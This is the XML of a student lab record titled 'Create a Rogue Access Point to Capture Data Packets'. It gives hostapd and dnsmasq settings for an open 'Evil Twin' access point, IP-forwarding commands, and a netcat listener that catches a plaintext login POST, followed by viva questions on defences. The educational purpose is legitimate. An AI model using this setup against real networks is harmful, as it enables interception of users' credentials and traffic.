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52DEA">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Thiruvarsan S G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> |  Roll No: 241901</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:b/>
          <w:sz w:val="20"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>117</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="020A2223">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:t>Exercise 17</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD0F6D5">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Create a Rogue Access Point to Capture Data Packets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0581A627">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Aim</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A39D7BE">
      <w:r>
        <w:t>To understand how a Rogue ('Evil Twin') Access Point attack works, and simulate creating one in a controlled virtual lab to capture unencrypted victim traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78165C3F">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Theory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1739D726">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14:paraId="080DEDAB">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Tools Required (full lab version)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6578445C">
      <w:r>
        <w:t>Kali Linux, hostapd (fake AP), dnsmasq (DHCP/DNS), Wireshark; simulated via a virtual bridge between two lab VMs (attacker + victim) instead of real over-the-air broadcast, keeping the exercise fully contained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E47F9F5">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Procedure (full lab version)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB298D7">
      <w:r>
        <w:t>1. sudo apt update &amp;&amp; sudo apt install hostapd dnsmasq -y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39912678">
      <w:r>
        <w:t>2. /etc/hostapd/hostapd.conf: interface=at0, driver=nl80211, ssid=Free_Lab_WiFi, hw_mode=g, channel=6, auth_algs=1, wpa=0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC475DB">
      <w:r>
        <w:t>3. /etc/dnsmasq.conf: interface=at0, dhcp-range=192.168.50.10,192.168.50.100,12h, dhcp-option=3,192.168.50.1, dhcp-option=6,192.168.50.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7590078C">
      <w:r>
        <w:t>4. sudo sysctl -w net.ipv4.ip_forward=1; sudo systemctl start dnsmasq; sudo hostapd /etc/hostapd/hostapd.conf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C2B103">
      <w:r>
        <w:t>5. Connect the victim VM (isolated lab network only) to Free_Lab_WiFi; it receives a DHCP lease from dnsmasq.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEC16D5">
      <w:r>
        <w:t>6. On the attacker machine, capture the interface and watch the victim's plaintext HTTP submissions arrive (demonstrated below using a stand-in local server, since hostapd/a second VM were not available in this run's environment).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55797304">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>What was actually run here: capturing a plaintext login submission</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776AD3F5">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14:paraId="3648F21D">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ nc -l 8765 &gt; raw_capture.txt &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br w:type="textWrapping"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ curl -X POST http://127.0.0.1:8765/login -d "username=victim&amp;password=PlainTextPass123" -H "Host: free-lab-wifi.local"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br w:type="textWrapping"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br w:type="textWrapping"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>--- raw_capture.txt (bytes as received on the wire)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free-lab-wifi.local</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br w:type="textWrapping"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>User-Agent: curl/8.7.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br w:type="textWrapping"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Accept: */*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br w:type="textWrapping"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Content-Length: 41</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username=victim&amp;password=PlainTextPass123</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0643BC">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14:paraId="179EAC22">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Expected Output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34186771">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14:paraId="78CAECD1">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14:paraId="16FD41F0">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Viva Questions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CAF164C">
      <w:pPr>
        <w:pStyle w:val="29"/>
      </w:pPr>
      <w:r>
        <w:t>Why do rogue APs typically use the same SSID as a trusted network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D6C935">
      <w:pPr>
        <w:pStyle w:val="29"/>
      </w:pPr>
      <w:r>
        <w:t>Why does this attack fail against HTTPS-only traffic?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B0B4C8">
      <w:pPr>
        <w:pStyle w:val="29"/>
      </w:pPr>
      <w:r>
        <w:t>What is the role of dnsmasq in this setup, separate from hostapd?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F73B148">
      <w:pPr>
        <w:pStyle w:val="29"/>
      </w:pPr>
      <w:r>
        <w:t>How can users protect themselves from connecting to a rogue AP?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B06DE"/>
    <w:rsid w:val="18A31A7B"/>
    <w:rsid w:val="43854DD3"/>
    <w:rsid w:val="74D31A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3421</Characters>
  <Lines>0</Lines>
  <Paragraphs>0</Paragraphs>
  <TotalTime>0</TotalTime>
  <ScaleCrop>false</ScaleCrop>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>3965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2026-10-14T14:03:02Z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E95BC6B05C404905940EBB326F122D5B_13</vt:lpwstr>
  </property>
</Properties>
</file>